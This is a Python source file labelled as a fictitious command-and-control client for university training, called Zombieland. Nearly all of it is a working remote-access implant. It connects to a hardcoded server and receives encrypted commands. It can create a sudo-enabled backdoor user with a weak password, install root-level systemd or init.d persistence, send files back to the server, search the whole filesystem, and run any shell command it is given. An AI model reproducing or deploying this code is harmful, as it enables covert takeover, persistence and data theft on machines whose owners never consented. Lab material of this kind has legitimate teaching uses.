#!/usr/bin/env python3
# Lab client (Zombieland) — Fictitious C2 agent for university training
import socket
import json
import os
import random
import string
import subprocess
import threading
import time
import struct
import sys
from cryptography.fernet import Fernet

class ZombieClient:
    def __init__(self, server_ip, server_port, client_id, key):
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_id = client_id
        self.cipher_suite = Fernet(key)
        self.running = True
        self.connect_to_server()
        
        # Start keepalive heartbeat loop for real-time dashboard ECG telemetry
        self.heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
        self.heartbeat_thread.start()

    def connect_to_server(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.server_ip, self.server_port))
        self.sock.sendall(self.client_id.encode())
        print("Connected to server")

    def receive_encrypted_message(self):
        # Read robust 4-byte header length
        hdr = self.sock.recv(4)
        if not hdr: return None
        (length,) = struct.unpack(">I", hdr)
        data = b""
        while len(data) < length:
            chunk = self.sock.recv(length - len(data))
            if not chunk: return None
            data += chunk
        return self.cipher_suite.decrypt(data).decode()

    def send_encrypted_message(self, message):
        # Send with robust 4-byte header length
        enc = self.cipher_suite.encrypt(message.encode())
        self.sock.sendall(struct.pack(">I", len(enc)) + enc)

    def listen_for_commands(self):
        while self.running:
            try:
                command = self.receive_encrypted_message()
                if not command:
                    break
                print(f"Received command: {command}")
                response = self.execute_command(command)
                self.send_encrypted_message(json.dumps(response))
            except Exception as e:
                print(f"Error: {e}")
                break

    def is_systemd(self):
        try:
            subprocess.run(["pidof", "systemd"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError:
            return False

    def heartbeat_loop(self):
        while self.running:
            try:
                cpu_percent = 10
                mem_percent = 35
                try:
                    import psutil
                    cpu_percent = psutil.cpu_percent()
                    mem_percent = psutil.virtual_memory().percent
                except:
                    pass
                
                # Fetch OS dynamically
                import platform
                os_name = "Linux"
                try:
                    os_name = platform.system()
                except:
                    pass

                payload = {
                    "ping": time.time(),
                    "telemetry": {
                        "hostname": socket.gethostname(),
                        "os": os_name,
                        "cpu_percent": cpu_percent,
                        "mem_percent": mem_percent,
                    }
                }
                self.send_encrypted_message(json.dumps(payload))
            except Exception:
                break
            time.sleep(10)

    def execute_command(self, command):
        try:
            if command.startswith("createuser"):
                username = ''.join(random.choices(string.ascii_lowercase, k=8))
                password = username
                os.system(f"useradd -m -p $(openssl passwd -1 {username}) {username}")
                os.system(f"usermod -aG sudo {username}")
                return {"result": f"User {username} created with password {password}"}
                
            elif command.startswith("persistence"):
                client_file_path = os.path.abspath(__file__)
                if self.is_systemd():
                    service_file_path = "/etc/systemd/system/zombie_persistence.service"
                    service_file_content = f'''[Unit]
Description=Zombie Persistence Service
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/bin/python3 {client_file_path}
StandardOutput=inherit
StandardError=inherit
Restart=always
User=root

[Install]
WantedBy=multi-user.target
'''
                    with open(service_file_path, "w") as f:
                        f.write(service_file_content)

                    os.system("systemctl daemon-reload")
                    os.system("systemctl enable zombie_persistence.service")
                    os.system("systemctl start zombie_persistence.service")
                    return {"result": "Systemd service created and started"}
                else:
                    persistence_file_path = "/etc/init.d/zombie_persistence"
                    with open(persistence_file_path, "w") as f:
                        f.write("#!/bin/bash\n")
                        f.write("### BEGIN INIT INFO\n")
                        f.write("# Provides:          zombie_persistence\n") 
                        f.write("# Required-Start:    $remote_fs $syslog\n")
                        f.write("# Required-Stop:     $remote_fs $syslog\n")
                        f.write("# Default-Start:     2 3 4 5\n")
                        f.write("# Default-Stop:      0 1 6\n")
                        f.write("# Short-Description: Starts zombie persistence script\n")
                        f.write("# Description:       Starts the zombie persistence script which runs every 60 seconds\n")
                        f.write("### END INIT INFO\n")
                        f.write(f"while true; do python3 {client_file_path}; sleep 60; done\n")

                    os.system(f"chmod +x {persistence_file_path}")
                    os.system("update-rc.d zombie_persistence defaults")
                    os.system("service zombie_persistence enable")
                    os.system("service zombie_persistence start")
                    return {"result": "Init.d script created and started"}
                    
            elif command.startswith("download"):
                parts = command.split(" ")
                file_path = parts[1]
                if os.path.exists(file_path):
                    file_size = os.path.getsize(file_path)
                    # Sends size with length prefix header
                    self.send_encrypted_message(str(file_size))
                    # Raw socket chunk stream as written in Zombieland.py
                    with open(file_path, "rb") as f:
                        while chunk := f.read(4096):
                            self.sock.sendall(chunk)
                    return {"result": f"File {file_path} downloaded successfully"}
                else:
                    return {"error": "File not found"}
                    
            elif command.startswith("upload"):
                parts = command.split(" ", 2)
                file_path = parts[1]
                file_data = parts[2].encode('latin1')
                with open(file_path, "wb") as f:
                    f.write(file_data)
                return {"result": f"File {file_path} uploaded successfully"}
                
            elif command.startswith("search"):
                parts = command.split(" ", 1)
                search_term = parts[1]
                matches = []
                for root, dirs, files in os.walk("/"):
                    for name in files:
                        if search_term in name:
                            matches.append(os.path.join(root, name))
                return {"matches": matches}
                
            elif command.startswith("lz"):
                result = os.popen("ls -la").read()
                formatted_result = "\n".join(result.splitlines())
                return {"result": formatted_result}
                
            else:
                # Raw fallback shell execution
                result = os.popen(command).read()
                return {"result": result}
                
        except Exception as e:
            return {"error": str(e)}

if __name__ == "__main__":
    client_id = 'test_zombie'
    key = b'JFPP2O_6nhlCZIUFKS6IdQZFNOek0i-WEFKFYK3dXKs='
    zombie = ZombieClient("192.168.1.40", 5555, client_id, key)
    zombie.listen_for_commands()
